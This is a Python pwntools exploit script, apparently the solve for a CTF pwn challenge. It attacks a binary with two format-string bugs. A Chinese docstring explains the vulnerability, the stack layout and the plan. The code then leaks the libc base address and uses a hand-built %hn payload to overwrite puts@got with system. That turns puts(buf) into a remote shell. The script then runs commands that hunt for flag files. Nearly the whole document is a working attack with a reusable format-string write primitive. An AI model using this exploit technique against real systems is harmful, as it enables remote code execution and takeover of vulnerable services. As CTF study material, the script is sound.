#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
题目 22 · 这怎么可以作为名字啊！  (Pwn, 973pts, 2 solves)

附件: firmware/22_这怎么可以作为名字啊！/attachment.zip
      -> pwn (ELF64, not stripped), libc.so.6 (Ubuntu glibc 2.35-0ubuntu3.13), ld-linux-x86-64.so.2

--------------------------------------------------------------------------
漏洞  (objdump -d pwn,  main @ 0x4011fb)
--------------------------------------------------------------------------
    char buf[0x80];                       // rbp-0x80
    init();                               // setvbuf(stdin/out/err, NULL, _IONBF, 0)
    puts("What's your name?");
    read(0, buf, 0x18);                   // "名字" = 24 字节, 不保证 NUL 结尾
    printf(buf);                          // (1) 格式化字符串 #1   <-- "什么字符都可以作为名字"
    puts("Good name!But do you know the magic of printf?");
    puts("Tell me something you know about printf!");
    read(0, buf + 0x18, 0x40);            // 64 字节
    printf(buf + 0x18);                   // (2) 格式化字符串 #2
    puts(buf);                            // (3) 参数 = 名字缓冲区
    puts("Oh,obviously you don't know the magic!");
    puts("Good bye");

保护: No PIE (基址 0x400000) / No canary / NX on / Partial RELRO (GOT 可写)
GOT:  puts@0x404018  printf@0x404020  read@0x404028  setvbuf@0x404030
      (pwn 的 DT_NEEDED 是字面量 "./libc.so.6", 必须 cd 到附件目录运行)

--------------------------------------------------------------------------
利用思路  (两步格式化字符串, 单连接, 无爆破)
--------------------------------------------------------------------------
main 的 rsp = rbp-0x80, 故 call printf 后栈上可变参数:
    arg6 = buf[0..7]   arg7 = buf[8..15]   arg8 = buf[16..23]
    arg9 = buf+0x18    (第二次 printf 的格式化串起点 -> fmtstr offset = 9)
    arg23 = [rbp+8] = __libc_start_call_main+128 = libc_base + 0x29d90  (实测)

第 1 次输入 (名字, 24B) = b"sh;#%23$p|%8$s\\x00\\x00" + p64(printf@got)
  * 作为格式化串:
      %23$p  -> 栈上返回地址, 得 libc 基址 (无需在 payload 里放地址)
      %8$s   -> 直接读 printf@got 里的真实地址(原始字节), 用于交叉校验
  * 同时它本身就是一条合法 shell 命令: `sh` 后面以 `#` 开头的是注释
    -> 等我们把 puts@got 改成 system 后, puts(buf) 会直接起一个交互 shell

第 2 次输入 (64B) = 手写 fmtstr: 把 puts@got 写成 system (offset 9)
  puts@got = system;  随后 puts(buf) == system("sh;#%23$p|%8$s") -> sh

  注意: 不要用 pwntools 的 fmtstr_payload(write_size='short').
  实测它对部分地址会生成**错误** payload (例如 system=0x790844a50d70 时
  0x40401d 处的高位字节被后一条 %n 覆盖, puts@got 变成 0x844a50d70 直接 SIGSEGV).
  下面 build_fmtstr() 自己算: 3 个 %hn 原子, 按数值升序发射保证打印计数单调,
  地址 8 字节对齐追加在格式串之后(其高位 0 字节同时充当 NUL 终止符),
  长度固定 <= 64.

--------------------------------------------------------------------------
用法
--------------------------------------------------------------------------
  python3 scripts/22-solve.py                      # 本地 (附件目录内自带 ld/libc)
  python3 scripts/22-solve.py <host> [port]        # 远程, port 默认 80
  python3 scripts/22-solve.py <host> --flag        # 远程, 自动找 flag 后退出
  LOGLEVEL=debug python3 scripts/22-solve.py ...   # 详细日志
"""
import os
import re
import sys
import time
import glob

from pwn import *

context.arch = "amd64"
context.log_level = os.environ.get("LOGLEVEL", "info")

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)

PUTS_GOT = 0x404018
PRINTF_GOT = 0x404020
RET_OFF = 0x29D90          # __libc_start_call_main+128, 由 %23$p 泄漏, 实测
FMT_OFFSET = 9             # 第 2 个格式化串缓冲区起始参数槽
MAX_ATTEMPTS = 4


def find_attach():
    cands = [
        os.path.join(ROOT, "work", "22_names"),
        os.path.join(ROOT, "firmware", "22_这怎么可以作为名字啊！"),
    ]
    for d in cands:
        if os.path.exists(os.path.join(d, "pwn")):
            return d
    hits = glob.glob(os.path.join(ROOT, "work", "**", "pwn"), recursive=True)
    if hits:
        return os.path.dirname(hits[0])
    raise SystemExit("[-] 找不到 pwn, 请先把 attachment.zip 解到 work/22_names/")


ATTACH = find_attach()
PWN = os.path.join(ATTACH, "pwn")
LIBC_PATH = os.path.join(ATTACH, "libc.so.6")
LD_PATH = os.path.join(ATTACH, "ld-linux-x86-64.so.2")

libc = ELF(LIBC_PATH, checksec=False)
# 注意: 重试时不要依赖 libc.address (它会残留), 一律用固定偏移
PRINTF_OFF = libc.symbols["printf"]
SYSTEM_OFF = libc.symbols["system"]


# ---------------------------------------------------------------- 手写 fmtstr
def build_fmtstr(addr, value, argbase=FMT_OFFSET, maxlen=64):
    """把 value 写到 addr; 用 argbase 起的参数槽, 返回 <= maxlen 的 payload.

    只用 %hn (2 字节) 原子; 按块值升序发射, 保证 printf 已打印字符数单调递增.
    地址(8 字节, 含 0x00 高位)紧跟在格式串之后 -> 同时充当格式串的 NUL 终止符,
    否则 printf 会越过 64 字节缓冲区去解析未初始化栈内存.
    """
    nchunk = max(3, (value.bit_length() + 15) // 16 if value else 1)
    chunks = [(addr + 2 * i, (value >> (16 * i)) & 0xFFFF) for i in range(nchunk)]
    chunks.sort(key=lambda c: c[1])
    for off in range(8 * (nchunk * 5 // 8 + 1), maxlen - 8 * nchunk + 1, 8):
        idx0 = argbase + off // 8
        fmt = b""
        count = 0
        for i, (_a, v) in enumerate(chunks):
            if v > count:                       # 需要补打印字符
                fmt += b"%" + str(v - count).encode() + b"c"
                count = v
            fmt += b"%" + str(idx0 + i).encode() + b"$hn"
        if len(fmt) <= off:
            payload = fmt + b"A" * (off - len(fmt)) + b"".join(p64(a) for a, _ in chunks)
            if len(payload) <= maxlen:
                return payload
    raise ValueError("fmtstr payload 放不进 %d 字节" % maxlen)


# ---------------------------------------------------------------- 连接
def connect(argv):
    if argv:
        host = argv[0]
        port = 80
        if len(argv) > 1 and argv[1].isdigit():
            port = int(argv[1])
        # ctfplus 给的是 9080-<uuid>.challenge.ctfplus.cn:
        # 前缀数字只是内部端口标签, 但整串本身也常可解析 -> 两种名字/两种端口都试
        ports = [port]
        names = [host]
        m = re.match(r"^(\d+)-", host)
        if m:
            if int(m.group(1)) not in ports:
                ports.append(int(m.group(1)))
            names.append(host[m.end():])
        last = None
        for name in names:
            for pt in ports:
                try:
                    log.info("connect %s:%d" % (name, pt))
                    return remote(name, pt, timeout=8)
                except Exception as e:  # noqa: BLE001
                    last = e
        raise SystemExit("[-] 连接失败: %r" % (last,))

    os.chmod(PWN, 0o755)
    os.chmod(LD_PATH, 0o755)
    # DT_NEEDED 是字面量 "./libc.so.6" -> 必须在附件目录里运行
    return process([LD_PATH, "--library-path", ATTACH, PWN], cwd=ATTACH)


# ---------------------------------------------------------------- 单次尝试
def attempt(argv):
    p = connect(argv)

    def bail(msg):
        log.warning(msg)
        try:
            p.close()
        except Exception:  # noqa: BLE001
            pass
        return None

    # ---- stage 1: 名字 = 泄漏格式化串 + 将来要执行的 shell 命令 ----
    name = b"sh;#%23$p|%8$s\x00\x00" + p64(PRINTF_GOT)
    assert len(name) == 24, len(name)
    p.recvuntil(b"name?")
    p.send(name)
    p.recvuntil(b"sh;#")
    blob = p.recvuntil(b"Good name!", drop=True)

    m = re.match(rb"(0x[0-9a-fA-F]+)\|", blob)
    if not m:
        return bail("泄漏格式不符: %r" % blob[:64])
    ret = int(m.group(1), 16)
    raw = blob[m.end():]                         # printf@got 原始字节(可能被 0 截断)
    base = ret - RET_OFF

    if (base & 0xFFF) or not (0x1000 < base < 0x800000000000):
        return bail("泄漏基址不可信: ret=0x%x base=0x%x" % (ret, base))
    system = base + SYSTEM_OFF

    nb = min(len(raw), 6)
    rawaddr = u64(raw[:6].ljust(8, b"\x00"))
    if nb >= 2:
        mask = (1 << (8 * nb)) - 1
        if ((rawaddr ^ (base + PRINTF_OFF)) & mask) != 0:
            return bail("GOT 交叉校验失败: 0x%x vs 0x%x" % (rawaddr, base + PRINTF_OFF))
        log.info("GOT 交叉校验通过 (%d/%d 字节)" % (nb, 6))
    log.success("libc base = 0x%x   system = 0x%x" % (base, system))

    # ---- stage 2: puts@got -> system ----
    payload = build_fmtstr(PUTS_GOT, system)
    log.info("stage2 payload = %d bytes: %r" % (len(payload), payload[:24]))
    p.recvuntil(b"printf!")
    p.send(payload.ljust(64, b"\x00"))
    time.sleep(0.2)
    # stage2 的 printf 会打印大量填充字符(最多 6 万), 排空它
    try:
        p.recvrepeat(1.0)
    except EOFError:
        pass

    # ---- stage 3: puts(buf) == system("sh;#...") -> shell ----
    p.sendline(b"echo __PWNED__; id")
    try:
        out = p.recvrepeat(3)
    except EOFError:
        out = b""
    if b"__PWNED__" not in out:
        return bail("本轮到不了 shell, 进程输出: %r" % out[-160:])
    log.success("got shell (puts@got == system)")
    return p


def exploit(argv):
    for i in range(1, MAX_ATTEMPTS + 1):
        log.info("=== attempt %d/%d ===" % (i, MAX_ATTEMPTS))
        try:
            p = attempt(argv)
        except EOFError:
            log.warning("attempt %d 连接提前关闭" % i)
            p = None
        if p is not None:
            return p
    return None


FLAG_CMDS = [
    "cat /flag /flag.txt /flag* 2>/dev/null",
    "cat flag flag.txt /home/*/flag* /root/flag* /pwn/flag* /app/flag* 2>/dev/null",
    "ls -la / /home /root /app /pwn /srv /opt 2>/dev/null",
    "find / -maxdepth 3 -iname '*flag*' -not -path '/proc/*' -not -path '/sys/*' 2>/dev/null",
    "env",
]
FLAG_RE = re.compile(rb"(?:0xGame|flag|ctf|CTF)\{[^}\n]{1,200}\}")


def hunt_flag(p):
    found = []
    for c in FLAG_CMDS:
        p.sendline(c.encode())
        try:
            data = p.recvrepeat(1.5)
        except EOFError:
            break
        print(data.decode("latin-1"))
        for m in FLAG_RE.finditer(data):
            cand = m.group(0).decode("latin-1")
            if cand not in found:
                found.append(cand)
    for f in found:
        log.success("FLAG CANDIDATE: %s" % f)
    return found


def main():
    argv = [a for a in sys.argv[1:] if not a.startswith("--")]
    auto = "--flag" in sys.argv
    p = exploit(argv)
    if p is None:
        log.failure("利用失败")
        sys.exit(1)
    if auto:
        hunt_flag(p)
        p.close()
    else:
        p.interactive()


if __name__ == "__main__":
    main()
